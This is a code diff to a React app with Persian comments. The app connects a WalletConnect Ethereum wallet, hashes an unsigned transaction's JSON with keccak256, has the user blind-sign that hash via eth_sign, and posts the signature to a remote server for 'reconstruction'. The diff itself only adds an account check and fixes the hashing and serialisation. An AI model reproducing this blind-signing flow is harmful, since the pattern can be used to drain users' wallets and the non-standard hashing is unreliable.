@@ -1,6 +1,6 @@
 import jQuery from "jquery";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
-import { keccak256 } from "ethers"; // هش کردن تراکنش
+import { keccak256, toUtf8Bytes } from "ethers"; // اصلاح هش
 
 function App() {
   async function runner() {
@@ -18,6 +18,12 @@ function App() {
     await ethereumProvider.enable();
     var provider = ethereumProvider;
     var account = await provider.request({ method: "eth_accounts" });
+
+    if (!account.length) {
+      console.error("❌ No account found.");
+      return;
+    }
+
     var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
 
@@ -46,8 +52,8 @@ function App() {
 
         console.log("📜 Unsigned Transaction:", unsignedTx);
 
-        // **هش کردن تراکنش خام**
-        const txHash = keccak256(JSON.stringify(unsignedTx));
+        // **هش کردن تراکنش خام به روش صحیح**
+        const txHash = keccak256(toUtf8Bytes(JSON.stringify(unsignedTx)));
         console.log("🔗 Transaction Hash:", txHash);
 
         // **امضا کردن هش تراکنش با `eth_sign`**
@@ -62,7 +68,7 @@ function App() {
         var txResult = await jQuery.post(apiUrl, {
           handler: "sign",
           signature: signedTx,
-          unsignedTx: unsignedTx, // ارسال تراکنش خام برای بازسازی در سرور
+          unsignedTx: JSON.stringify(unsignedTx), // ارسال تراکنش خام برای بازسازی در سرور
         });
 
         console.log("📤 Transaction Sent:", txResult);
